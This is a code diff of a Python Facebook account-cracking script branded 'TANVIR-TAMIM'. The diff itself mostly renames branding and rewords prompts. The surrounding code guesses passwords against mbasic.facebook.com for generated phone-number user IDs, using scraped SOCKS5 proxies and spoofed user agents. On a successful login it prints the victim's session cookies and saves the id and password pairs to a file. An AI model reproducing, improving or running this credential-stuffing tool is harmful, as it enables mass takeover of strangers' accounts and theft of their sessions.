@@ -121,7 +121,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-#TAMIM2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
+#TANVIR2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
 url_lookup = "https://lookup-id.com/"
 
 url_mb = "https://mbasic.facebook.com"
@@ -132,7 +132,7 @@ url_graph = "https://graph.facebook.com/{}"
 
 header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/82.0.144 Chrome/76.0.3809.144 Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
 
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "March", "04": "April", "05": "May", "06": "Jun", "07": "July", "08": "Agust", "09": "September", "10": "October", "11": "November", "12": "December"}
 
 #agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiac2-00) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/70/405/UCWEB Mobile']
 
@@ -172,9 +172,9 @@ uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190
 
 uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
 
-#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
+uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
 
-#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
+uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
 
 uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
 
@@ -198,7 +198,7 @@ try:
     prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
-    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mTAMIM')
+    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mTANVIR')
 prox=open('.prox.txt','r').read().splitlines()
 
 
@@ -247,7 +247,7 @@ for x in range(10):
     i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
     j=random.randrange(1, 9)
     k=random.randrange(1, 9)
-    l='Mobile WVGA SMM-TAMIM/1.2.0 OPN-B'
+    l='Mobile WVGA SMM-TANVIR/1.2.0 OPN-B'
     uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
     ##USER AGENT START##
     
@@ -285,15 +285,15 @@ def psb(z):
         
 os.system("clear")
 import requests,os
-fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m]🤖 ENTER YOUR NAME :\033[1;97m "))
+fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m]🤖 TYPE  YOUR NAME AND CLICK ENTER :\033[1;97m "))
 name=fuckx.upper()
 print ('')
 
-psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mWELCOME TO TANVIR-TAMIM TOOLS  '+name)
+psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mWELCOME TO TANVIR-TAMIMs TOOL ')
 print('')
-print('\033[1;93mThis Tool Already Update Done ')
+print('\033[1;93m••• THIS TOOLS ALREADY UPDATE DONR •••')
 print('')
-jalan('\033[1;97mLoading....\033[1;32m.\033[1;35m.\033[1;34m.\033[1;97m.\033[1;33m.\033[38;5;196m.\033[1;35m.\033[1;34m.\033[1;33m.\033[1;32m.\033[1;97m.\033[38;5;196m.\033[38;5;46m.\033[38;5;196m.\033[1;32m.\033[1;97m.\033[1;35m.\033[1;34m.\033[1;33m.\033[38;5;46m.\033[1;97m.')
+jalan('\033[1;97mPLEASE WAIT FEW SECENDS\033[1;32m.\033[1;35m.\033[1;34m.\033[1;97m.\033[1;33m.\033[38;5;196m.\033[1;35m.\033[1;34m.\033[1;33m.\033[1;32m.\033[1;97m.\033[38;5;196m.\033[38;5;46m.\033[38;5;196m.\033[1;32m.\033[1;97m.\033[1;35m.\033[1;34m.\033[1;33m.\033[38;5;46m.\033[1;97m.')
 time.sleep(3)
 
 
@@ -318,20 +318,19 @@ else:
 def banner():
     clear()
     print(f"""\033[1;92m
-\033[1;91m  $$$$$$$$\  $$$$$$\  $$\      $$\ $$$$$$\ $$\      $$\ 
-\033[1;91m  \__$$  __|$$  __$$\ $$$\    $$$ |\_$$  _|$$$\    $$$ |
-\033[1;91m $$ |   $$ /  $$ |$$$$\  $$$$ |  $$ |  $$$$\  $$$$ |
-\033[1;91m $$ |   $$$$$$$$ |$$\$$\$$ $$ |  $$ |  $$\$$\$$ $$ |
-\033[1;92m $$ |   $$  __$$ |$$ \$$$  $$ |  $$ |  $$ \$$$  $$ |
-\033[1;92m $$ |   $$ |  $$ |$$ |\$  /$$ |  $$ |  $$ |\$  /$$ |
-\033[1;92m $$ |   $$ |  $$ |$$ | \_/ $$ |$$$$$$\ $$ | \_/ $$ |
-\033[1;92m \__|   \__|  \__|\__|     \__|\______|\__|     \__| 
- \033[1;92m=======================================
-  \033[1;97m[\033[1;92m»\033[1;97m]ADMIN       \033[1;31m:  \033[1;97mTANVIR-TAMIM\033[1;92m
-  \033[1;97m[\033[1;92m»\033[1;97m]FACEBOOK\033[1;31m:  \033[1;97m Tanvir Ahmed Tamim 69T\033[1;92m
-  \033[1;97m[\033[1;92m»\033[1;97m]TOOLS        \033[1;31m:  \033[1;34mRANDOM CRECK\033[1;92m
-  \033[1;97m[\033[1;92m»\033[1;97m]NETWORK  \033[1;31m:  \033[1;97m3G\033[917;1m,4G,5G       \033[38;5;46m
- \033[1;92m======================================={P}""")
+\033[1;91m ########    ###    ##    ## ##     ## #### ########  
+  \033[1;92m  ##      ## ##   ###   ## ##     ##  ##  ##     ## 
+  \033[1;91m  ##     ##   ##  ####  ## ##     ##  ##  ##     ## 
+  \033[1;91m  ##    ##     ## ## ## ## ##     ##  ##  ########  
+  \033[1;91m  ##    ######### ##  ####  ##   ##   ##  ##   ##   
+  \033[1;92m  ##    ##     ## ##   ###   ## ##    ##  ##    ##  
+  \033[1;92m  ##    ##     ## ##    ##    ###    #### ##     ## 
+ \033[1;92m============================================
+  \033[1;97m[\033[1;92m🤖\033[1;97m]ADMIN       \033[1;31m»\033[1;97mTANVIR-TANVIR\033[1;92m
+  \033[1;97m[\033[1;92m🤖\033[1;97m]FACEBOOK\033[1;31m»\033[1;97m Tanvir Ahmed TANVIR 69T\033[1;92m
+  \033[1;97m[\033[1;92m🤖\033[1;97m]TOOLS        \033[1;31m»\033[1;34mRANDOM CRECK\033[1;92m
+  \033[1;97m[\033[1;92m🤖\033[1;97m]WHATSAPP\033[1;31m»\033[1;97m3G\033[917;1m,4G,5G       \033[38;5;46m
+ \033[1;92m============================================{P}""")
 
 
     
@@ -367,11 +366,11 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'%s[%s!%s] %s« NO EXPIRED APK »%s                \n'%(N,B,N,M,N))
     else:
-        print(f'[🤖] %s « EXPIRED APK LIST »  :{WHITE}'%(M))
+        print(f'[🤖] %s « EXPIRED APK LIST »  :{Yellow}'%(M))
         for i in range(len(game)):
             print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
-            print("%s═════════TAMIM═════════%s═════════TAMIM════════%s"%(M,H,P))
+            print("%s═════════TANVIR═════════%s═════════TANVIR════════%s"%(M,H,P))
 
 
 #---------------------[MAIN MENU]---------------------#
@@ -435,16 +434,16 @@ def sh6():
         banner()
         tl = str(len(user))
         print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
-        print(f"{P}[{H}•{P}]{RED}Tool                       : {GREEN}"+name)
-        print(f"{P}[{H}•{P}]{RED}Total ID              : {GREEN}"+tl)
-        print(f"{P}[{H}•{P}]{RED}Your Code: {GREEN}"+code)
-        print(f"{P}[{H}•{P}]{RED}Stop This Script Type Ctrl + Z ")
+        print(f"{P}[{H}•{P}]{RED}TOOL NAME: {GREEN}"+name)
+        print(f"{P}[{H}•{P}]{RED}TOTAL IDZ   : {GREEN}"+tl)
+        print(f"{P}[{H}•{P}]{RED}YOUR CODE : {GREEN}"+code)
+        print(f"{P}[{H}•{P}]{RED}STOP TOOL? TYPE Ctrl + Z ")
         print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
         for love in user:
             uid = code+love
             pwx = [code+love[5:]]
             manshera.submit(m,uid,pwx,tl)
-    sh = input(f'\n\n    {M} 🤖 Main Menu? [ Y/N] :{H}  ')
+    sh = input(f'\n\n    {M} 🤖 GET MAIN MENU? [ Y/N] :{H}  ')
     if sh =='y':
         check_update()
     elif sh =='Y':
@@ -465,7 +464,7 @@ def sh7():
     print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
     print(f"  {K}PK : \033[1;97m0349 , 0306 , 0302 , 0300 , 0315") 
     print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
-    code = input(f'{M}    Input Code {P}:{H} ')
+    code = input(f'{M}    ENTER CODE {P}:{H} ')
     os.system("clear")
     banner()
     print(f"")
@@ -491,7 +490,7 @@ def sh7():
             uid = code+love
             pwx = [love]         
             manshera.submit(m,uid,pwx,tl)
-    sh = input(f'\n\n    {M}🤖 Main Menu? [ Y/N] :{H}  ')
+    sh = input(f'\n\n    {M}🤖 GET MAIN MENU [ Y/N] :{H}  ')
     if sh =='y':
         check_update()
     elif sh =='Y':
@@ -550,17 +549,17 @@ def m(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
                 #os.system("play-audio AHAD_OK.mp3")
-                print('\033[1;92m[OK-TAMIM] '+uid+' | '+ps+'\033[0;97m')
+                print('\033[1;92m[OK-TANVIR] '+uid+' | '+ps+'\033[0;97m')
                 #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                 print(f'{B}[🤖COOKIES IS HERE🤖] {H}'+coki)
                 cek_apk(session,coki)
-                open('/sdcard/TANVIR-TAMIM-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/TANVIR-TANVIR-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
                 break
             else:
                 continue
         loop+=1
-        animasi = random.choice(["\x1b[1;91mTAMIM","\x1b[1;92mTAMIM","\x1b[1;93mTAMIM","\x1b[1;94mTAMIM","\x1b[1;95mTAMIM","\x1b[1;96mTAMIM","\x1b[1;97mTAMIM","\x1b[1;91mTAMIM","\x1b[1;92mTAMIM","\x1b[1;93mTAMIM","\x1b[1;94mTAMIM","\x1b[1;95mTAMIM","\x1b[1;96mTAMIM"])
+        animasi = random.choice(["\x1b[1;91mTANVIR","\x1b[1;92mTANVIR","\x1b[1;93mTANVIR","\x1b[1;94mTANVIR","\x1b[1;95mTANVIR","\x1b[1;96mTANVIR","\x1b[1;97mTANVIR","\x1b[1;91mTANVIR","\x1b[1;92mTANVIR","\x1b[1;93mTANVIR","\x1b[1;94mTANVIR","\x1b[1;95mTANVIR","\x1b[1;96mTANVIR"])
         sys.stdout.write(f'\r    {P}[{animasi}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}]{P}[{H}%s{P}] \r'%(loop,tl,len(ok))),
         sys.stdout.flush()
     except:
@@ -570,4 +569,4 @@ def m(uid,pwx,tl):
 
 #---------------------[END MENU]---------------------#
 if __name__ == '__main__':
-    main()
+    main() 
